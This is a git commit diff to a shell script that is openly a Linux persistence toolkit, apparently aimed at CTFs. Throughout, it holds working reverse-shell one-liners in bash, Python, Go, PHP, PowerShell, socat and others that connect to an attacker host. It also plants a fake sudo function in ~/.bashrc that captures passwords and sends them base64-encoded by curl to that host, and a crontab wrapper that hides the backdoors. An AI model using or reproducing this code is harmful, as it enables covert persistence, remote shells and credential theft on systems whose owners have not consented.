ec005d2521890df6bab248760b8baae9609b6b4c
montysecurity <18372298+montysecurity@users.noreply.github.com>
2022-01-27 03:04:31 -0600

    added find writable; stealth-mod is broken

--- linper.sh
+++ linper.sh
@@ -2,34 +2,24 @@
 
 CLEAN=0
 CLEANSYSMSG=0
+COUNTER=0
 CRON="* * * * *"
 DISABLEBASHRC=0
 DRYRUN=0
+EASYINSTALLDIR=$(echo $WRITABLE_DIR/$(uuidgen))
 ENUM_DEF=0
 VALIDSYNTAX=0
 LIMIT=0
 STEALTHMODE=0
-COUNTER=0
+PIPDIR=$(echo $WRITABLE_DIR/$(uuidgen))
+PIP3DIR=$(echo $WRITABLE_DIR/$(uuidgen))
 REMOVALTOOL=$(which srm) || REMOVALTOOL=$(which rm)
 RANDOMPHPFILE=$(echo $(uuidgen).php)
 RANDOMPORT=$(expr 1024 + $RANDOM)
 SHELL="/bin/bash"
 SERVICEFILE=$(echo $(uuidgen).service)
 SERVICESHELLSCRIPT=$(echo $(uuidgen).sh)
-TMPCLEANBASHRC=$(echo /dev/shm/$(uuidgen))
-TMPCLEANBASHRC2=$(echo /dev/shm/$(uuidgen))
-TMPCLEANBASHRC3=$(echo /dev/shm/$(uuidgen))
-TMPCLEANRCLOCAL=$(echo /dev/shm/$(uuidgen))
-TMPCRON=$(echo /dev/shm/$(uuidgen))
-TMPCRONWITHPAYLOAD=$(echo /dev/shm/$(uuidgen))
-TMPEASYINSTALLDIR=$(echo /dev/shm/$(uuidgen))
-TMPJJSFILE=$(echo /dev/shm/$(uuidgen))
-TMPPASSWORDFILE=$(echo /dev/shm/$(uuidgen))
-TMPPIPDIR=$(echo /dev/shm/$(uuidgen))
-TMPPIP3DIR=$(echo /dev/shm/$(uuidgen))
-TMPRCLOCAL=$(echo /dev/shm/$(uuidgen))
-TMPWEB=$(echo /dev/shm/$(uuidgen))
-TMPGOFILE=$(echo /dev/shm/$(uuidgen).go)
+
 
 INFO="linux persistence toolkit\n\nadvisory: this was developed with ctfs in mind and that is its intended use case. please do not use this tool in an unethical or illegal manner.\n"
 
@@ -42,7 +32,8 @@ HELP="\e[33m-h, --help\e[0m show this message
 \e[33m-l, --limit\e[0m number of reverse shells to install (default: all)
 \e[33m--cron\e[0m cron schedule for any reverse shells executed by crontab (default: every minute)
 \e[33m-c, --clean\e[0m removes any reverse shells installed by this program for the given RHOST
-\e[33m-s, --stealth-mode\e[0m various trivial modifications in an attempt to hide the backdoors from humans"
+\e[33m-s, --stealth-mode\e[0m various trivial modifications in an attempt to hide the backdoors from humans
+\e[33m-w, --writable-dir\e[0m set the directory to install any temporary files (default: checks /dev/shm, /tmp, and /var/tmp)"
 
 EXAMPLES="Examples:
 
@@ -117,6 +108,10 @@ do
 	-e|--enum-defenses)
 		shift
 		ENUM_DEF=1 ;;
+	-w|--writable-dir)
+		shift
+		WRITABLE_DIR="$1" 
+		shift ;;
 	esac
 done
 
@@ -160,43 +155,73 @@ limit_checker(){
 
 }
 
+find_writable() {
+
+	echo -e "\e[92m[+]\e[0m Searching for writable directory to store temporary files"
+	if [ -z ${WRITABLE_DIR+x} ];
+	then
+		export WRITABLE_DIR=$(find /dev/shm /var/tmp /tmp -type d -writable 2> /dev/null | grep --color=never -o -e '^/dev/shm$' -e '^/var/tmp$' -e '^/tmp$' | head -n 1)
+	else
+		if [ $WRITABLE_DIR = "." ];
+		then
+			export WRITABLE_DIR=$(pwd)
+		fi
+		export WRITABLE_DIR=$(find $WRITABLE_DIR -type d -writable 2> /dev/null | head -n 1)
+	fi
+
+	TMPTEST=$WRITABLE_DIR/$(uuidgen)
+
+	(touch $TMPTEST && $REMOVALTOOL $TMPTEST) 2> /dev/null || (echo -e "\e[91m[-]\e[0m Error: Could not find a writable directory for temporary files" && echo -e "\e[93m[!]\e[0m Action: You can force one with -w, --writable-dir" && echo -e "\e[91m[-]\e[0m Killing Process" && kill -9 $$)
+
+	echo -e "\e[92m[+]\e[0m Choosing $WRITABLE_DIR"
+
+
+	export TMPCRON=$(echo $WRITABLE_DIR/$(uuidgen))
+	export TMPCRONWITHPAYLOAD=$(echo $WRITABLE_DIR/$(uuidgen))
+	export TMPJJSFILE=$(echo $WRITABLE_DIR/$(uuidgen))
+	export SUDOPASSWORDFILE=$(echo $WRITABLE_DIR/$(uuidgen))
+	export TMPRCLOCAL=$(echo $WRITABLE_DIR/$(uuidgen))
+	export TMPGOFILE=$(echo $WRITABLE_DIR/$(uuidgen).go)
+
+}
+
 stealth_modifications(){
 
 	DISABLEBASHRC=1
 	SERVICEFILE=$(echo /etc/systemd/system/.$(uuidgen).service)
 	SERVICESHELLSCRIPT=$(echo /etc/systemd/system/.$(uuidgen))
 
-	echo 'function crontab () {
-	REALBIN="$(which crontab)"
-	if $(echo "$1" | grep -qi "\-l");
-	then
-	if [ `$REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'" | wc -l` -eq 0 ];
-	then
-		echo no crontab for $(whoami)
-	else 
-		$REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'"
-	fi
-	elif $(echo "$1 | grep -qi "\-r");
-	then
-	if $(`$REALBIN` -l | grep "'$RHOST'" | grep -qi "'$RPORT'");
-	then
-		`$REALBIN` -l | grep --color=never "'$RHOST'" | grep --color=never "'$RPORT'" | crontab
-	else
-		$REALBIN -r
-	fi
-	else
-	$REALBIN "${@:1}"
-	fi
-	}' >> ~/.bashrc && echo -e "\e[92m[+]\e[0m --stealth-mode modificaitons complete" && echo "-----------------------"
+	echo 'function crontab () { #linpercrontab
+	REALBIN="$(which crontab)" #linpercrontab
+	if $(echo "$1" | grep -qi "\-l"); #linpercrontab
+	then #linpercrontab
+		if [ `$REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'" | wc -l` -eq 0 ]; #linpercrontab
+		then #linpercrontab
+			echo no crontab for $(whoami) #linpercrontab
+		else #linpercrontab
+			$REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'" #linpercrontab
+		fi #linpercrontab
+	elif $(echo "$1" | grep -qi "\-r"); #linpercrontab
+	then #linpercrontab
+		if $(`$REALBIN -l | grep "'$RHOST'" | grep -qi "'$RPORT'"`); #linpercrontab
+		then #linpercrontab
+			$REALBIN -l | grep --color=never "'$RHOST'" | grep --color=never "'$RPORT'" | crontab #linpercrontab
+		else #linpercrontab
+			$REALBIN -r #linpercrontab
+		fi #linpercrontab
+	else #linpercrontab
+		$REALBIN "${@:1}" #linpercrontab
+	fi #linpercrontab
+	} #linpercrontab' >> ~/.bashrc && echo -e "\e[92m[+]\e[0m --stealth-mode modificaitons complete" && echo "-----------------------"
 
 }
 
 METHODS=(
 	"awk , awk --version , awk 'BEGIN {s = \\\"/inet/tcp/0/$RHOST/$RPORT\\\"; while(42) { do{ printf \\\"shell>\\\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \\\$0 |& s; close(c); } } while(c != \\\"exit\\\") close(s); }}' /dev/null?"
 	"bash , bash -c 'exit' , bash -c 'bash -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'?"
-	"easy_install , mkdir /dev/shm/$TMPEASYINSTALLDIR && echo 'import sys,socket,os,pty;exit()' > /dev/shm/$TMPEASYINSTALLDIR/setup.py; easy_install /dev/shm/$TMPEASYINSTALLDIR 2> /dev/null &> /dev/null , mkdir /dev/shm/$TMPEASYINSTALLDIR; echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' > /dev/shm/$TMPEASYINSTALLDIR/setup.py; easy_install /dev/shm/$TMPEASYINSTALLDIR?"
+	"easy_install , mkdir $WRITABLE_DIR/$EASYINSTALLDIR && echo 'import sys,socket,os,pty;exit()' > $WRITABLE_DIR/$EASYINSTALLDIR/setup.py; easy_install $WRITABLE_DIR/$EASYINSTALLDIR 2> /dev/null &> /dev/null , mkdir $WRITABLE_DIR/$EASYINSTALLDIR; echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' > $WRITABLE_DIR/$EASYINSTALLDIR/setup.py; easy_install $EASYINSTALLDIR?"
 	"gdb , gdb -nx -ex 'python import sys,socket,os,pty;exit()' &> /dev/null , echo 'c' | gdb -nx -ex 'python import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' -ex quit &> /dev/null?"
-	"go , echo 'package main;import\"os\";func main() { os.Exit(0) };' > $TMPGOFILE && go run $TMPGOFILE , echo 'package main;import\\\"os/exec\\\";import\\\"net\\\";func main(){c,_:=net.Dial(\\\"tcp\\\",\\\"$RHOST:$RPORT\\\");cmd:=exec.Command(\\\"$SHELL\\\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > $TMPGOFILE && go run $TMPGOFILE && $REMOVALTOOL $TMPGOFILE?"
+	"go , echo 'package main;import\"os\";func main() { os.Exit(0) };' > $TMPGOFILE && go run $TMPGOFILE , echo 'package main;import\\\"os/exec\\\";import\\\"net\\\";func main(){c,_:=net.Dial(\\\"tcp\\\",\\\"$RHOST:$RPORT\\\");cmd:=exec.Command(\\\"$SHELL\\\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > $TMPGOFILE && go run $TMPGOFILE?"
 	"irb , echo \\\"require 'socket'\\\" | irb --noecho --noverbose , echo \\\"require 'socket'; exit if fork;c=TCPSocket.new('$RHOST',$RPORT);while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read} end\\\" | irb --noecho --noverbose?"
 	"jrunscript , jrunscript -e 'exit();' , jrunscript -e 'var host=\\\"$RHOST\\\"; var port=$RPORT;var p=new java.lang.ProcessBuilder(\\\"$SHELL\\\", \\\"-i\\\").redirectErrorStream(true).start();var s=new java.net.Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50);try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'?"
 	"jjs , echo \"quit()\" > $TMPJJSFILE && jjs $TMPJJSFILE , echo 'var ProcessBuilder = Java.type(\\\"java.lang.ProcessBuilder\\\");var p=new ProcessBuilder(\\\"$SHELL\\\", \\\"-i\\\").redirectErrorStream(true).start();var Socket = Java.type(\\\"java.net.Socket\\\");var s=new Socket(\\\"$RHOST\\\",$RPORT);var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\\\"java.lang.Thread\\\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs?" 
@@ -207,8 +232,8 @@ METHODS=(
 	"php , php -r 'exit();' , php -r \\\"exec(\\\\\\\"$SHELL -c '$SHELL -i >& /dev/tcp/$RHOST/$RPORT 0>&1'\\\\\\\");\\\"?"
 	"php7.4 , php7.4 -r 'exit();' , php7.4 -r \\\"exec(\\\\\\\"$SHELL -c '$SHELL -i >& /dev/tcp/$RHOST/$RPORT 0>&1'\\\\\\\");\\\"?"
 	"pwsh , pwsh -command 'exit' , pwsh -command '\\\$client = New-Object System.Net.Sockets.TCPClient(\\\"$RHOST\\\",$RPORT);\\\$stream = \\\$client.GetStream();[byte[]]\\\$bytes = 0..65535|%{0};while((\\\$i = \\\$stream.Read(\\\$bytes, 0, \\\$bytes.Length)) -ne 0){;\\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\\$bytes,0, \\\$i);\\\$sendback = (iex \\\$data 2>&1 | Out-String );\\\$sendback2 = \\\$sendback + \\\"# \\\";\\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\\$sendback2);\\\$stream.Write(\\\$sendbyte,0,\\\$sendbyte.Length);\\\$stream.Flush()};\\\$client.Close()'?"
-	"pip , mkdir /dev/shm/$TMPPIPDIR; echo 'import socket,subprocess,os;exit()' > /dev/shm/$TMPPIPDIR/setup.py; pip install /dev/shm/$TMPPIPDIR 2>&1 | grep -qi 'ERROR: No .egg-info directory found in' , mkdir /dev/shm/$TMPPIPDIR; echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' > /dev/shm/$TMPPIPDIR/setup.py; pip install /dev/shm/$TMPPIPDIR?"
-	"pip3 , mkdir /dev/shm/$TMPPIP3DIR && echo 'import socket,subprocess,os;exit()' > /dev/shm/$TMPPIP3DIR/setup.py; pip3 install /dev/shm/$TMPPIP3DIR 2>&1 | grep -qi 'ERROR: No .egg-info directory found in' , mkdir /dev/shm/$TMPPIP3DIR; echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' > /dev/shm/$TMPPIP3DIR/setup.py; pip3 install /dev/shm/$TMPPIP3DIR?"
+	"pip , mkdir $PIPDIR; echo 'import socket,subprocess,os;exit()' > $PIPDIR/setup.py; pip install $PIPDIR 2>&1 | grep -qi 'ERROR: No .egg-info directory found in' , mkdir $PIPDIR; echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' > $PIPDIR/setup.py; pip install $PIPDIR?"
+	"pip3 , mkdir $PIP3DIR && echo 'import socket,subprocess,os;exit()' > $PIP3DIR/setup.py; pip3 install $PIP3DIR 2>&1 | grep -qi 'ERROR: No .egg-info directory found in' , mkdir $PIP3DIR; echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' > $PIP3DIR/setup.py; pip3 install $PIP3DIR?"
 	"python , python -c 'import socket,subprocess,os;exit()' , python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);'?"
 	"python2 , python2 -c 'import socket,subprocess,os;exit()' , python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);'?"
 	"python2.7 , python2.7 -c 'import socket,subprocess,os;exit()' , python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);'?"
@@ -216,7 +241,7 @@ METHODS=(
 	"python3.8 , python3.8 -c 'import socket,subprocess,os;exit()' , python3.8 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);'?"
 	"ruby , ruby -rsocket -e 'exit' , ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\\\"'$RHOST'\\\",'$RPORT');while(cmd=c.gets);IO.popen(cmd,\\\"r\\\"){|io|c.print io.read}end'?"
 	"socat , socat tcp-listen:$RANDOMPORT STDOUT & echo exit | socat -t 1 STDIN tcp-connect:0.0.0.0:$RANDOMPORT , socat tcp-connect:$RHOST:$RPORT exec:$SHELL,pty,stderr,setsid,sigint,sane?"
-	"telnet , echo quit | telnet , TELNETNAMEDPIPE=\\\$(echo /dev/shm/$(uuidgen);mkfifo \\\$TELNETNAMEDPIPE && telnet $RHOST $RPORT 2> /dev/null 0<\\\$TELNETNAMEDPIPE | $SHELL 1>\\\$TELNETNAMEDPIPE 2> /dev/null & sleep .0001 #?"
+	"telnet , echo quit | telnet , TELNETNAMEDPIPE=\\\$(echo $WRITABLE_DIR/$(uuidgen);mkfifo \\\$TELNETNAMEDPIPE && telnet $RHOST $RPORT 2> /dev/null 0<\\\$TELNETNAMEDPIPE | $SHELL 1>\\\$TELNETNAMEDPIPE 2> /dev/null & sleep .0001 #?"
 )
 
 enum_methods() {
@@ -337,20 +362,20 @@ sudo_hijack_attack() {
 	then
 		if [ "$DRYRUN" -eq 0 ];
 		then
-			echo 'function sudo () {
-			REALSUDO="$(which sudo)"
-			TMPPASSWORDFILE="'$TMPPASSWORDFILE'"
-			read -s -p "[sudo] password for $USER: " PASSWD
-			printf "\n"; printf "%s\n" "$USER : $PASSWD" >> $TMPPASSWORDFILE
-			sort -uo "$TMPPASSWORDFILE" "$TMPPASSWORDFILE"
-			ENCODED=$(cat "$TMPPASSWORDFILE" | base64) > /dev/null 2>&1
-			curl -k -s "https://'$RHOST'/$ENCODED" > /dev/null 2>&1
-			$REALSUDO -S <<< "$PASSWD" -u root bash -c "exit" > /dev/null 2>&1
-			$REALSUDO "${@:1}"
-			}' >> ~/.bashrc &&
+			echo 'function sudo () { #linpersudo
+			REALSUDO="$(which sudo)" #linpersudo
+			SUDOPASSWORDFILE="'$SUDOPASSWORDFILE'" #linpersudo
+			read -s -p "[sudo] password for $USER: " PASSWD #linpersudo
+			printf "\n"; printf "%s\n" "$USER : $PASSWD" >> $SUDOPASSWORDFILE #linpersudo
+			sort -uo "$SUDOPASSWORDFILE" "$SUDOPASSWORDFILE" #linpersudo
+			ENCODED=$(cat "$SUDOPASSWORDFILE" | base64) > /dev/null 2>&1 #linpersudo
+			curl -k -s "https://'$RHOST'/$ENCODED" > /dev/null 2>&1 #linpersudo
+			$REALSUDO -S <<< "$PASSWD" -u root bash -c "exit" > /dev/null 2>&1 #linpersudo
+			$REALSUDO "${@:1}" #linpersudo
+			} #linpersudo' >> ~/.bashrc &&
 			echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access" &&
-			echo "[+] Password will be Stored in $TMPPASSWORDFILE" &&
-			echo "[+] $TMPPASSWORDFILE will be exfiltrated to https://$RHOST/ as a base64 encoded GET parameter"
+			echo "[+] Password will be Stored in $SUDOPASSWORDFILE" &&
+			echo "[+] $SUDOPASSWORDFILE will be exfiltrated to https://$RHOST/ as a base64 encoded GET parameter"
 		else
 			echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Possible"
 		fi
@@ -377,28 +402,31 @@ shadow() {
 
 cleanup() {
 
+	TMPCLEANBASHRC=$(echo $WRITABLE_DIR/$(uuidgen))
+	TMPCLEANBASHRC2=$(echo $WRITABLE_DIR/$(uuidgen))
+	TMPCLEANBASHRC3=$(echo $WRITABLE_DIR/$(uuidgen))
+	TMPCLEANRCLOCAL=$(echo $WRITABLE_DIR/$(uuidgen))
+
 	echo -e "\e[92m[+]\e[0m Removing modifications, this may take a while..."
 	
-	if $(grep -qi $1 ~/.bashrc) && $(grep -qi "function crontab" ~/.bashrc) && $(grep -qi REALBIN ~/.bashrc);
+	if $(grep -qi "#linpercrontab" ~/.bashrc);
 	then
-		cat ~/.bashrc | sed '1,/function crontab/!d' | grep -v "function crontab" > $TMPCLEANBASHRC
-		cp $TMPCLEANBASHRC ~/.bashrc
+		grep -v "#linpercrontab" ~/.bashrc > $TMPCLEANBASHRC &&
+		cp $TMPCLEANBASHRC ~/.bashrc &&
 		echo -e "\e[92m[+]\e[0m Removed crontab function from ~/.bashrc"
 	fi
 
-	if $(grep -qi $1 ~/.bashrc) && $(grep -qi "function sudo" ~/.bashrc) && $(grep -qi REALSUDO ~/.bashrc) && $(grep -qi TMPPASSWORDFILE ~/.bashrc);
+	if $(grep -qi "#linpersudo" ~/.bashrc);
 	then
-		grep -v "`grep -B 11 -A 5 "REALBIN -r" ~/.bashrc`" ~/.bashrc > $TMPCLEANBASHRC
-		grep -v 'if \$(echo "$1" | grep -qi "\\-l");' $TMPCLEANBASHRC > $TMPCLEANBASHRC2
-		grep -v 'elif \$(echo "$1 | grep -qi "\\-r");' $TMPCLEANBASHRC2 > $TMPCLEANBASHRC3
-		cp $TMPCLEANBASHRC3 ~/.bashrc
+		grep -v "#linpersudo" ~/.bashrc > $TMPCLEANBASHRC &&
+		cp $TMPCLEANBASHRC ~/.bashrc &&
 		echo -e "\e[92m[+]\e[0m Removed sudo function from bashrc"
 	fi
 
-	if $(cat ~/.bashrc | grep -q $1);
+	if $(grep -q $1 ~/.bashrc);
 	then
-		grep --color=never -v $1 ~/.bashrc > $TMPCLEANBASHRC
-		cp $TMPCLEANBASHRC ~/.bashrc
+		grep -v $1 ~/.bashrc > $TMPCLEANBASHRC &&
+		cp $TMPCLEANBASHRC ~/.bashrc &&
 		echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from ~/.bashrc"
 	fi
 
@@ -432,9 +460,9 @@ cleanup() {
 		echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from systemctl"
 	fi
 
-	if $(cat /etc/rc.local 2> /dev/null | grep -q $1);
+	if $(grep -q $1 /etc/rc.local 2> /dev/null);
 	then
-		grep --color=never -v $1 "/etc/rc.local" > $TMPCLEANRCLOCAL
+		grep -v $1 "/etc/rc.local" > $TMPCLEANRCLOCAL
 		cp $TMPCLEANRCLOCAL "/etc/rc.local"
 		if $(cat /etc/rc.local | wc -l | grep -q "^2$");
 		then
@@ -445,7 +473,7 @@ cleanup() {
 
 	if $(cat /etc/skel/.bashrc 2> /dev/null | grep -q $1);
 	then
-		grep --color=never -v $1 /etc/skel/.bashrc > $TMPCLEANBASHRC
+		grep -v $1 /etc/skel/.bashrc > $TMPCLEANBASHRC
 		cp $TMPCLEANBASHRC /etc/skel/.bashrc
 		echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from /etc/skel/.bashrc"
 	fi
@@ -467,6 +495,7 @@ main() {
 	
 	if [ "$CLEAN" -eq 1 ];
 	then
+		find_writable
 		cleanup $RHOST
 		exit
 	fi
@@ -476,16 +505,23 @@ main() {
 		enum_defenses
 		exit
 	fi
-	
+
 	if [ "$STEALTHMODE" -eq 1 ];
 	then
-		stealth_modifications
+		echo "[+] --stealth-mode is currently broken"
+		#stealth_modifications
 	fi
 	
-	sudo_hijack_attack $TMPPASSWORDFILE
+	find_writable
+	sudo_hijack_attack $SUDOPASSWORDFILE
 	shadow
 	enum_methods
 	webserver_poison_attack
+
+	echo -e "\e[92m[+]\e[0m Removing temporary files"
+	remove_tmp_files
+	echo -e "\e[92m[+]\e[0m Done"
+	exit 0
 
 }
 
